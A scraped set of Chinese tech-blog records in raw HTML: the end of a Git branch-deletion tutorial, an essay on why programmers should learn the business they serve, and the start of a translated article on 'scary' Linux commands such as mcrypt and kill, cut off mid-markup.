</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>我不再给出终端输出，需要你自己尝试，但你可以在 <a href=\"https://github.com/kedark3/Demo/tree/myBranch2\">GitHub 代码库</a> 中验证你的结果。</p>\n<h3 id=\"toc_3\">删除分支</h3>\n<p>由于我们增加了两个分支，下面删除其中的一个（<code>myBranch</code>），包括两步：</p>\n<ol>\n<li><strong>删除本地分支</strong> 你不能删除正在操作的分支，故切换到 <code>master</code> 分支 （或其它你希望保留的分支），命令及终端输出如下：<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/e1b4762c1603c531f92cc662147e319d.png\" alt=\"\"><code>git branch</code> 可以列出可用的分支，使用 <code>checkout</code> 切换到 <code>master</code> 分支，然后使用 <code>git branch -D myBranch</code> 删除该分支。再次运行 <code>git branch</code> 检查是否只剩下两个分支（而不是三个）。</li>\n<li><strong>删除 GitHub 上的分支</strong> 使用如下命令删除 <code>myBranch</code> 的远程分支：<br>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee27a6050397009\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit push origin :myBranch\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee27a6050397009-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee27a6050397009-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee27a6050397009-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">push </span><span class=\"crayon-v\">origin</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">myBranch</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee27a6050397009-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<br>\n<img class=\"aligncenter\" title=\"Terminal output\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1b91a34117a4ea69a12a6c9f714f9def.png\" alt=\"Terminal output\"></li>\n</ol>\n<p>上面 <code>push</code> 命令中分支名称前面的冒号（<code>:</code>）告知 GitHub 删除分支。另一种写法为：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee27ab314783560\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit push -d origin myBranch\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee27ab314783560-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee27ab314783560-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee27ab314783560-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">push</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">origin </span><span class=\"crayon-i\">myBranch</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee27ab314783560-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>其中 <code>-d</code> (也可以用 <code>--delete</code>) 也用于告知 GitHub 删除你的分支。</p>\n<p>我们学习了 Git 分支的使用，在本系列的下一篇文章中，我们将介绍如何执行 <code>fetch</code> 和 <code>rebase</code> 操作，对于多人同时的贡献的项目而言，这是很必须学会的。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114107\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114107votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114107\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Git,Linux", "url": "http://blog.jobbole.com/114107/", "url_obj_id": "90144cba629e28c20a0e4a2ee1876768"}
{"front_img_url": ["http://ww3.sinaimg.cn/mw690/7cc829d3gw1eizj4iuehrj20eq0b2gn2.jpg"], "title": "为什么码农要了解业务？", "create_date": "2018/06/12 ·", "praise_num": 1, "fav_num": 3, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.toutiao.com/i6563215390107763208/\">来自 jerryhuang650 推荐\r\n</a>   </div><div>\n<p> 最近一位分析界的老前辈对我很无奈地摇摇头，“这帮程序员，不食人间烟火哪！”我也深有感触，全世界的码农都一个样。</p>\n<p>这让我想起了，同样也是他，在多年之前，对我提了警醒——要重视业务。从那之后，我一直狂奔在技术+业务的双修道路上。</p>\n<p>放在以前，码农这个族群一定是稀罕动物。但在今天，这个世界最不缺的应该就是码农了，未来最廉价的也将是码农。仅有泛泛一技，在未来并不吃香，因为那是要被机器人所取代的。</p>\n<p>这个世界，缺的是技术过硬又精通业务的工程师，缺的是真正能解决实际业务问题的人，缺的是复合型的人才。</p>\n<p>码农不是工程师，码农只是会写代码，只会明确需求和逻辑的情况下写代码。工程师则不一样，懂得用技术怎么解决实际业务问题，用技术驱动业务的发展。</p>\n<p><img class=\"alignnone\" src=\"http://ww3.sinaimg.cn/mw690/7cc829d3gw1eizj4iuehrj20eq0b2gn2.jpg\" width=\"530\" height=\"398\"></p>\n<h1><strong>什么叫业务？</strong></h1>\n<p>先来明确这个问题。</p>\n<p>业务是一个很实在的东西，看得见感受得到，接地气儿。</p>\n<p>业务就是我们所能理解和感受的世界，就是这个世界或者某个行业的运转逻辑、流程与现状，是结果表象，是能够被看见和感受的，也是内在本质，是能够被洞察和感知的。</p>\n<p>业务就是这个世界发生了什么，什么时候，谁参与，怎么发生，结果如何。</p>\n<p>业务就是什么时候，谁在哪里，买了什么东西，花了多少钱，用什么支付。</p>\n<p>业务就是这个行业怎么发展起来的，现状如何，未来趋势如何，用了什么技术，有什么企业，商业模式如何，盈利能力如何，目前主要面临什么问题，消费者有什么特点，等等。</p>\n<p>世界很复杂，单个细分行业的业务也很复杂。</p>\n<h1><strong>为什么要了解业务？</strong></h1>\n<p>谈到这个，码农们一定有所不悦，“熟悉业务是需求分析师做的事，跟我们没有关系。”</p>\n<p>打个不恰当的比喻。有10个人经过一栋写字楼，突然从楼上掉下来几块砖头，砸中了9个人，其中就有7个码农，3个硕士，1个博士（原谅我又犯职业病，拿数据说话了）。而没被砸到的那个人，恰好因为了解到之前经常发生这样的事而绕道行走。</p>\n<p>如果你只会写代码，你不是不可替代的，而是可有可无的。因为这年头，会JAVA、C、Python的程序员，在大街上一抓一大把。现在已经开始提倡，编程从娃娃抓起了。10后都开始跟你抢饭碗了，你怕不怕？</p>\n<p>但话也不是那么极端，除非你的技术很牛逼，在国内或者某个行业内能够排上号的。但技术牛逼的人，也不是只是技术超群，还常常因为能够利用手中的技术解决某方面的业务问题，做了哪些突出的贡献。我们出来混，也是要拿成果说话的，做过什么项目，有什么价值。这种价值往往就是针对业务而说的。</p>\n<p>IT研发与业务需求方常常是一对冤家，常常因为一个业务功能实现争辩得耳红面赤。研发觉得这个功能很low，没什么技术含量，业务方却认为这个功能却很有用，需要花功夫做细做深做好。现实情况是，功能做出来了，却很难用，或者经常用不了，或者数据不对。研发想做点高大上的功能，业务方却认为太虚了，没什么用。（IT与业务方那点事就不多说了，大家都心知肚明~~）</p>\n<p>多年经验反复告诫我，鉴定一个功能是不是好功能，唯一的标准是看它能否支撑业务、改善业务、推动业务，也即应用效果。一个产品，只要有30%的功能，让业务用户用起来很爽，感觉帮助很大，就已经是一个不错的产品了。</p>\n<p>我们都认同，技术驱动业务。但我们不一定明白，正是由于业务的某些强烈需求，才推动技术的发展与落地。</p>\n<p>说这些，我是想说，作为技术人员，我们既要仰望星空，也要脚踏实地，既要追逐腾飞的技术，也要重视落地的业务。</p>\n<p>如果一个业务人员很懂技术，那将很可能是技术人员的灾难。因为那样的话，业务人员会很强势，又或者那样就没有技术人员什么事了。</p>\n<p>当然，也不难想象，一个真正懂看数据的测试人员，就好比一个真正懂用算法的业务人员一样难得。</p>\n<h1><strong>业务与数据的关系</strong></h1>\n<p>真实（而不是杜撰、模拟、伪造）、可量化、可被记录的数据一定会反映真实世界某方面的业务情形。而现实当中很多业务场景都可由数据体现出来。</p>\n<p>零售是业务场景最繁多且最贴近我们生活的行业，可以从中找到很多方便理解的例子。</p>\n<p>当你在一个酷热难耐的夏天上午10点，走进位于公司附近的全家便利店，使用微信支付，花了3.5元，买了一瓶无糖330ml摩登罐的可乐，而且刷会员卡攒了100积分，而收银员MM返回给了你一张POS单据，这时你所发生的这一切都已经通过收银记录在了全家的数据库里。更糟糕的是，店里的摄像头也已经把你在店里的一举一动录了下来了，转化成为一帧帧图像数据。</p>\n<p>这就是，业务数据化。</p>\n<p>店长通过数据分析发现，最近3.5元330ml摩登罐可乐的销量比上月增长了20%，而消费者中75%是20-35岁的男性，相比之下，300ml塑料瓶装的可乐销量却下滑40%。店长权衡比较了一下，300ml塑料瓶装可乐利润低，330ml摩登罐可乐目前更受年轻人欢迎，考虑到日渐增长的租金压力，做了一个大胆的决定——下架300ml塑料瓶装可乐，增加330ml摩登罐可乐的商品。（又拿数据说话了。）</p>\n<p>这就是，数据业务化。</p>\n<p>或者，数据驱动业务。</p>\n<p>当我开始接触一个行业时，我通常会花2-3周的时间去了解这个行业的业务，然后就大致清楚这个行业有什么样的数据，可以做哪方面的分析，解决什么问题。</p>\n<p>当遇到不好理解的分析结果时，我经常使用业务联想法，设身处地去体会结果所反映的业务场景是什么样的。</p>\n<h1><strong>如何了解业务？</strong></h1>\n<p>这个说大了，就是如何看这个世界。每个人有每个人的方法论，每个人有每个人的世界观，每个人有每个人的逻辑思维。</p>\n<p>我们都知道，观念的转变是最难的，也有很多不确定性。有些人可能因为自己的切身体会一天就改变了之前几十年根深蒂固的看法，有些人任由三姑六婆苦口婆心地劝说就是不肯改变自己的择偶观，却有可能因为自己年岁渐大不断降低自己的标准。</p>\n<p>但最好也及早要形成科学的思考方法，帮助正确地理解这个世界。</p>\n<p>以“面-线-点”的方式可以较为全面、系统、深入地了解一个行业，然后是某个垂直领域，最后再到具体业务场景。</p>\n<p>佛系文化的流行，使得年轻一代降低对这个世界的关注度，一切都无所谓，一切都漠不关心。</p>\n<p>这个世界从来没有变好过，但我们每个人都是这个世界的匆匆过客，都是行走在自己的人生路上不断领略这个世界的美与丑。这世间的风景，这世间的悲欢离合，如果我们积极地探索与领悟，也不枉来这世间走一遭。</p>\n<p>保持好奇心，可以驱动我们的思考，强化我们的认知，丰富我们的内在。</p>\n<p>这是我想说的第二个方面。</p>\n<p>怀有好奇心，就会渐渐地敏锐观察这个世界，多问自己一些为什么。</p>\n<p>我家附近原来有个沃尔玛超市，现在地产商将它装修一番，引入了不少餐厅，刚开张不久，我就去那里吃饭，吃的是烤鸭，一个多两个月后，再去那里吃饭，发现有一半的餐厅已经关门了。</p>\n<p>在去地铁站的那条路上，每天人流如梭，一点点，即使到了深夜，依然有很多人在门口排队买奶茶。然而，仅仅隔了一个店铺的喜茶，做不下去，关门了。两三个月前又换成粉店，路转粉。每天下班路过时，发现店里顾客不到10个，门可罗雀。</p>\n<p>为什么每家一点点奶茶店门口，不管是什么时候都是很多人，他们是托儿还是真的顾客？</p>\n<p>因为喜欢新鲜，不喜欢在冰箱里存太多菜，且附近没有菜市场，所以常去买菜的还是附近的钱大妈。但我却没怎么去更近的一家生活超市，店面比较大，除果肉蔬菜外，也卖油盐酱醋，还有生活用品，但奇怪的是顾客却不到钱大妈的1/10。</p>\n<p>为什么几乎所有潮州牛肉店都很多人，有很多甚至在门口排了很长的队？</p>\n<p>观察到这些，常常会陷入思考，为什么会发生这些，新零售到底改变了什么？</p>\n<p>再举个例子。</p>\n<p>去年拿保温杯泡着枸杞的中年男火了。</p>\n<p>关于这个，我又问了自己几个问题：拿着保温杯泡着枸杞的是不是都是中年男？如果是，这个特征能否被数据量化？可否考虑加入到算法模型当中，加以应用起来？</p>\n<p>虽然很多问题，我没有找到答案，但多问自己问题，会引发自己不断深入思考，不断激发自己好奇心，不断去研究。</p>\n<p>很多业务知识都是零散的，不可能在短时间内完全了解，可以在日常不断积累。</p>\n<p>关于日常积累业务知识，可以经常询问懂业务的人。这是我想说的第三个方面。</p>\n<p>刚进公司的时候，我以为业务很简单。很快，我就发现里面的坑不少。加上所在团队的成员也是刚入职不久的，问问题没处可问。过了一个月之后，我发现隔壁团队有两个十年左右的老员工，业务很熟，而且人特好。于是，我几乎一遇到业务问题，就跑过去“骚扰”他们，他们也很乐意解答，如果他们不清楚，他们也会告诉我应该去找谁了解。大约半年之后，我基本摸透了顺丰的数据和业务情况。我也和那两位老员工建立了不错的友谊，即使后来换了部门，我也经常过去找他们。</p>\n<p>跟懂业务的人搞好关系，遇到业务问题，多咨询他们，这是最有效最接地气的办法。</p>\n<p>多看书，这是我想说的第四个方面。</p>\n<p>比如说，从事新零售领域方面的工作，总得先了解新零售是怎么回事。你可以去听专家们忽悠，但这样的机会很少，而且时间也有限，说不定成本还很高。</p>\n<p>读书则不一样。读书，意味着主动了解，主动去构建自己的知识体系。</p>\n<p>读书的重要性，这里不多言了。</p>\n<p>如果您读这篇文章的时候，您恰好也是一位数据人。我还想告诫一句：我们不能脱离业务去看数据，而是要时刻从业务角度去理解数据。</p>\n<p>我们不敢期望可以完全理解这个世界，但也憧憬着我们不单可以在代码的世界里畅快驰骋，论剑江湖，也可以放下身段洞察芸芸众生之百态，领悟人间世俗之真情。</p>\n<p>如果真的可以的话，就没有需求分析师什么事了。</p>\n<div></div>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"107275\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"107275votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"107275\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "职场,程序员", "url": "http://blog.jobbole.com/107275/", "url_obj_id": "c8e1a285b335f2a803ddd35756a4148a"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/04/11489667c4b61dbd7d1f86da23791294.jpg"], "title": "可怕的万圣节 Linux 命令", "create_date": "2018/04/18 ·", "praise_num": 1, "fav_num": 2, "comment_num": 1, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.networkworld.com/article/3235219/linux/scary-linux-commands-for-halloween.html\">Sandra Henry-stocker</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9552-1.html\">Linux中国/geekpi</a>   </div><p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/11489667c4b61dbd7d1f86da23791294.jpg\" alt=\"\"></p>\n<p>虽然现在不是万圣节，也可以关注一下 Linux 可怕的一面。什么命令可能会显示鬼、巫婆和僵尸的图像？哪个会鼓励“不给糖果就捣蛋”的精神？</p>\n<h3 id=\"toc_1\">crypt</h3>\n<p>好吧，我们一直看到 <code>crypt</code>。尽管名称不同，crypt 不是一个地窖，也不是垃圾文件的埋葬坑，而是一个加密文件内容的命令。现在，<code>crypt</code> 通常用一个脚本实现，通过调用一个名为 <code>mcrypt</code> 的二进制文件来模拟以前的 <code>crypt</code> 命令来完成它的工作。直接使用 <code>mycrypt</code> 命令是更好的选择。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93249ac0289953038\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ mcrypt x\r\nEnter the passphrase (maximum of 512 characters)\r\nPlease use a combination of upper and lower case letters and numbers.\r\nEnter passphrase:\r\nEnter passphrase:\r\n\r\nFile x was encrypted.\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249ac0289953038-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93249ac0289953038-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249ac0289953038-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93249ac0289953038-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249ac0289953038-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93249ac0289953038-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93249ac0289953038-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93249ac0289953038-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93249ac0289953038-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">mcrypt</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">x</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93249ac0289953038-2\"><span class=\"crayon-e\">Enter </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">passphrase</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">maximum </span><span class=\"crayon-i\">of</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">512</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">characters</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93249ac0289953038-3\"><span class=\"crayon-e\">Please </span><span class=\"crayon-st\">use</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">combination </span><span class=\"crayon-e\">of </span><span class=\"crayon-e\">upper </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lower </span><span class=\"crayon-st\">case</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">letters </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numbers</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93249ac0289953038-4\"><span class=\"crayon-e\">Enter </span><span class=\"crayon-v\">passphrase</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93249ac0289953038-5\"><span class=\"crayon-e\">Enter </span><span class=\"crayon-v\">passphrase</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93249ac0289953038-6\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa93249ac0289953038-7\"><span class=\"crayon-i\">File</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">was </span><span class=\"crayon-v\">encrypted</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93249ac0289953038-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>请注意，<code>mcrypt</code> 命令会创建第二个扩展名为 <code>.nc</code> 的文件。它不会覆盖你正在加密的文件。</p>\n<p><code>mcrypt</code> 命令有密钥大小和加密算法的选项。你也可以再选项中指定密钥，但 <code>mcrypt</code> 命令不鼓励这样做。</p>\n<h3 id=\"toc_2\">kill</h3>\n<p>还有 <code>kill</code> 命令 – 当然并不是指谋杀，而是用来强制和非强制地结束进程，这取决于正确终止它们的要求。当然，Linux 并不止于此。相反，它有各种 <code>kill</code> 命令来终止进程。我们有 <code>kill</code>、<code>pkill</code>、<code>killall</code>、<code>killpg</code>、<code>rfkill</code>、<code>skill</code>（）读作 es-kill）、<code>tgkill</code>、<code>tkill</code> 和 <code>xkill</code>。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93249acf670233668\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button 